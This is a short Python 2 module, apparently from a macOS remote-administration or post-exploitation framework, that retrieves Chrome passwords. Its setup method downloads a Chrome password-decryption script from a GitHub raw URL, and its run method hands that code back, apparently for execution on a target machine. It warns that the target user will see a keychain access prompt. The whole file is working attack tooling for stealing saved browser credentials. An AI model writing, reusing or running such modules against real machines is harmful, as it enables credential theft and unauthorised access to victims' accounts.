from helpers import *
import urllib2


class Module:
    """This module retrieves Chrome passwords.

    References:
        https://github.com/manwhoami/OSXChromeDecrypt
    """

    def __init__(self):
        self.info = {
            "Author": ["Marten4n6", "manwhoami"],
            "Description": "Retrieves Chrome passwords."
        }
        self.code = None

    def setup(self):
        print MESSAGE_ATTENTION + "This will prompt the user to allow keychain access."
        confirm = raw_input(MESSAGE_INPUT + "Are you sure you want to continue? [Y/n]: ").lower()

        if not confirm or confirm == "y":
            request_url = "https://raw.githubusercontent.com/manwhoami/OSXChromeDecrypt/master/chrome_passwords.py"
            request = urllib2.Request(url=request_url)
            response = "".join(urllib2.urlopen(request).readlines())

            self.code = response
            return True
        else:
            print MESSAGE_INFO + "Cancelled."
            return False

    def run(self):
        return self.code
